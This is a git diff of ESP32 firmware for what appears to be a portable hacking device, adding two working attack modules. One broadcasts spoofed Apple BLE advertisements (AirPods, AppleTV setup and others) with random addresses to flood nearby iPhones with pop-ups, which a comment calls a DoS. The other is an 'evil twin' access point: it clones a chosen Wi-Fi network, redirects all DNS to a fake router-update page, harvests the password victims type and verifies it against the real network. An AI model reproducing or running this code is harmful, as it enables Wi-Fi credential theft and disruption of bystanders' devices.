@@ -7,20 +7,21 @@
 #include "nvs_flash.h"
 #include "driver/gpio.h"
 #include "esp_event_loop.h"
-#include <WiFi.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 #include <Adafruit_NeoPixel.h>
 #include <U8g2_for_Adafruit_GFX.h>
-#include <WebServer.h>
-//BT
+// BT
 #include <BluetoothSerial.h>
 #include <BLEDevice.h>
 #include <BLEUtils.h>
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 #include <BleKeyboard.h>
-
+// WIFI
+#include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
 
 // STATE MANAGEMENT
 enum AppState {
@@ -36,6 +37,7 @@ enum AppState {
   STATE_BT_SERIAL,
   STATE_BT_HID,
   STATE_IPHONE_SPAM,
+  STATE_DEVIL_TWIN,
 };
 // Global variable to keep track of the current state
 AppState currentState = STATE_MENU;
@@ -55,7 +57,7 @@ enum MenuItem
   BT_SERIAL_CMD,
   BT_HID,
   IPHONE_SPAM,
-  BEACON_SWARM,
+  //BEACON_SWARM,
   DEVIL_TWIN,
   RFID_READ,
   RF_SCAN,
@@ -433,6 +435,165 @@ void runBTHid() {
   delay(5000);
 }
 // END BT HID //
+
+// START IPHONE SPAM //
+// DEVICE VARIABLES //
+const uint8_t DEVICES[][31] = {
+  /*
+    These are audio devices: wireless headphones / earbuds
+    It seems these need a shorter range between ESP & iDevice
+  */
+  // Airpods
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Max
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Gen 2
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Gen 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Pro Gen 2
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Power Beats
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Power Beats Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Solo Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Buds
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Flex
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats X
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Solo 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Betas Fit Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Buds Plus
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+};
+const uint8_t SHORT_DEVICES[][23] = {
+  /*
+    These are more general home devices
+    It seems these can work over long distances, especially AppleTV Setup
+  */  
+  // AppleTV Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Pair
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV New User
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV AppleID Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Wireless Audio Sync
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Homekit Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Keyboard Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Connecting to Network
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Homepod Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Setup New Phone
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Transfer Number
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // TV Color Balance
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Vision Pro
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+};
+
+BLEAdvertising *pAdvertising;  // global variable
+uint32_t delayMilliseconds = 1000;
+void initIphoneSpam() {
+  BLEDevice::init("AirPods 69");
+
+  // Increase BLE Power to 9dBm (MAX)
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  
+  // Create the BLE Server
+  BLEServer *pServer = BLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
+
+  // seems we need to init it with an address in setup() step.
+  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+}
+
+void runIphoneSpam() {
+  // First generate fake random MAC
+  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+  for (int i = 0; i < 6; i++){
+    dummy_addr[i] = random(256);
+
+    // It seems for some reason first 4 bits
+    // Need to be high (aka 0b1111), so we 
+    // OR with 0xF0
+    //if (i == 0){
+      //dummy_addr[i] |= 0xF0;
+    //}
+  }
+
+  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+
+  // Randomly pick data from one of the devices
+  // First decide short or long
+  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
+  int device_choice = random(2);
+  //int device_choice = 1;
+
+  if (device_choice == 0) {
+      int index = random(17);
+      oAdvertisementData.addData(String((char*)DEVICES[index]));
+  } else {
+      int index = random(13);
+      oAdvertisementData.addData(String((char*)SHORT_DEVICES[index]));
+  }
+  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
+      the three advertising PDU types when you want to connect to Apple devices.
+          // 0 = ADV_TYPE_IND, 
+          // 1 = ADV_TYPE_SCAN_IND
+          // 2 = ADV_TYPE_NONCONN_IND
+      Randomly using any of these PDU types may increase detectability of spoofed packets. 
+      What we know for sure:
+      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
+                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
+  */
+  int adv_type_choice = random(3);
+  if (adv_type_choice == 0){
+    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+  } else if (adv_type_choice == 1){
+    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
+  } else {
+    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+  }
+  // Set the device address, advertisement data
+  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+  pAdvertising->setAdvertisementData(oAdvertisementData);
+  // Set advertising interval
+  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
+      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
+      
+      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
+  */
+  //pAdvertising->setMinInterval(0x20);
+  //pAdvertising->setMaxInterval(0x20);
+  //pAdvertising->setMinPreferred(0x20);
+  //pAdvertising->setMaxPreferred(0x20);
+  // Start advertising
+  Serial.println("Sending Advertisement...");
+  pAdvertising->start();
+  delay(delayMilliseconds); // delay for delayMilliseconds ms
+  pAdvertising->stop();
+}
 // *** WIFI MODULES ***
 
 // Network data structure
@@ -828,6 +989,212 @@ void runWifiSniffer() {
     vTaskDelay(100 / portTICK_PERIOD_MS); // Short delay when paused to prevent busy-waiting
   }
 }
+
+// START DEVIL TWIN //
+// DEVIL_TWIN VARIABLE SETUP //
+typedef struct
+{
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+}  _DevilNetwork;
+
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 1, 1);
+DNSServer dnsServer;
+WebServer webServer(80);
+
+_DevilNetwork _devilnetworks[16];
+_DevilNetwork _selectedNetwork;
+// uses clearArry()
+String _correct = "";
+String _tryPassword = "";
+String bytesToStr(uint8_t* data, uint8_t len) {
+  String str = "";
+  for (uint8_t i = 0; i < len; i++) {
+    str += String(data[i], HEX);
+    if (i < len - 1) {
+      str += ":";
+    }
+  }
+  return str;
+}
+void performDevilScan() {
+  int n = WiFi.scanNetworks();
+  clearArray();
+  if (n >= 0) {
+    Serial.println("Scanned Networks:");
+    for (int i = 0; i < n && i < 16; ++i) {
+      _DevilNetwork devilnetwork;
+      devilnetwork.ssid = WiFi.SSID(i);
+      Serial.print("SSID: ");
+      Serial.println(devilnetwork.ssid);
+
+      Serial.print("BSSID: ");
+      for (int j = 0; j < 6; j++) {
+        devilnetwork.bssid[j] = WiFi.BSSID(i)[j];
+        Serial.print(devilnetwork.bssid[j], HEX);
+        if (j < 5) {
+          Serial.print(":");
+        }
+      }
+      Serial.println();
+
+      devilnetwork.ch = WiFi.channel(i);
+      Serial.print("Channel: ");
+      Serial.println(devilnetwork.ch);
+
+      _devilnetworks[i] = devilnetwork;
+    }
+  }
+}
+
+bool hotspot_active = false;
+bool deauthing_active = false;
+
+void handleResult() {
+  String html = "";
+  if (WiFi.status() != WL_CONNECTED) {
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
+    Serial.println("Wrong password tried !");
+  } else {
+    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
+    hotspot_active = false;
+    dnsServer.stop();
+    int n = WiFi.softAPdisconnect(true);
+    Serial.println(String(n));
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+    WiFi.softAP("DevilTwin", "12345678");
+    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
+    Serial.println("Good password was entered !");
+    Serial.println(_correct);
+  }
+}
+
+String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
+                   "</head><body><div class='content'>"
+                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
+                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
+                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
+                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
+                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+
+void handleIndex() {
+  if (webServer.hasArg("ap")) {
+    for (int i = 0; i < 16; i++) {
+      if (bytesToStr(_devilnetworks[i].bssid, 6) == webServer.arg("ap")) {
+        _selectedNetwork = _devilnetworks[i];
+      }
+    }
+  }
+
+  if (webServer.hasArg("deauth")) {
+    if (webServer.arg("deauth") == "start") {
+      deauthing_active = true;
+    } else if (webServer.arg("deauth") == "stop") {
+      deauthing_active = false;
+    }
+  }
+
+  if (webServer.hasArg("hotspot")) {
+    if (webServer.arg("hotspot") == "start") {
+      hotspot_active = true;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    } else if (webServer.arg("hotspot") == "stop") {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("DevilTwin", "12345678");
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    }
+    return;
+  }
+
+  if (hotspot_active == false) {
+    String _html = _tempHTML;
+
+    for (int i = 0; i < 16; ++i) {
+      if (_devilnetworks[i].ssid == "") {
+        break;
+      }
+      _html += "<tr><td>" + _devilnetworks[i].ssid + "</td><td>" + bytesToStr(_devilnetworks[i].bssid, 6) + "</td><td>" + String(_devilnetworks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_devilnetworks[i].bssid, 6) + "'>";
+
+      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_devilnetworks[i].bssid, 6)) {
+        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
+      } else {
+        _html += "<button>Select</button></form></td></tr>";
+      }
+    }
+
+    if (deauthing_active) {
+      _html.replace("{deauth_button}", "Stop deauthing");
+      _html.replace("{deauth}", "stop");
+    } else {
+      _html.replace("{deauth_button}", "Start deauthing");
+      _html.replace("{deauth}", "start");
+    }
+
+    if (hotspot_active) {
+      _html.replace("{hotspot_button}", "Stop EvilTwin");
+      _html.replace("{hotspot}", "stop");
+    } else {
+      _html.replace("{hotspot_button}", "Start EvilTwin");
+      _html.replace("{hotspot}", "start");
+    }
+
+    if (_selectedNetwork.ssid == "") {
+      _html.replace("{disabled}", " disabled");
+    } else {
+      _html.replace("{disabled}", "");
+    }
+
+    _html += "</table>";
+
+    if (_correct != "") {
+      _html += "</br><h3>" + _correct + "</h3>";
+    }
+
+    _html += "</div></body></html>";
+    webServer.send(200, "text/html", _html);
+  } else {
+    if (webServer.hasArg("password")) {
+      _tryPassword = webServer.arg("password");
+      WiFi.disconnect();
+      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
+    } else {
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updatedPassword:  ");
+    }
+  }
+}
+void initDevilTwin() {
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAP("DevilTwin", "12345678");
+  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+  performDevilScan(); // Add this line to perform the network scan
+  webServer.on("/", handleIndex);
+  webServer.on("/result", handleResult);
+  //webServer.on("/admin", handleAdmin);
+  webServer.onNotFound(handleIndex);
+  webServer.begin();
+
+}
+void runDevilTwin() {
+  webServer.handleClient();
+  dnsServer.processNextRequest();
+  delay(10);
+}
+
 // *** GPS MODULES ***
 
 // *** TOOLS MODULES ***
@@ -1012,15 +1379,22 @@ void executeSelectedMenuItem() {
       currentState = STATE_BT_HID;
       initBTHid();
       delay(2000);
-      runBTHID();
+      runBTHid();
       break;
     case IPHONE_SPAM:
       Serial.println("IPHONE SPAM button pressed");
       currentState = STATE_IPHONE_SPAM;
       initBTHid();
       delay(2000);
-      runBTHID();
+      runBTHid();
       break;
+    case DEVIL_TWIN:
+      Serial.println("DEVIL TWIN button pressed");
+      currentState = STATE_DEVIL_TWIN;
+      initDevilTwin();
+      delay(2000);
+      runDevilTwin();
+      break;      
   }
 }
 void displayTitleScreen()
@@ -1167,6 +1541,15 @@ void loop() {
     case STATE_IPHONE_SPAM:
     if (isButtonPressed(HOME_BUTTON_PIN)) {
         cleanupBTScan();
+        delay(3000);
+        currentState = STATE_MENU;
+        drawMenu();
+        delay(500); // Debounce delay
+        return;
+      }      break;
+    case STATE_DEVIL_TWIN:
+    if (isButtonPressed(HOME_BUTTON_PIN)) {
+        //cleanupBTScan();
         delay(3000);
         currentState = STATE_MENU;
         drawMenu();
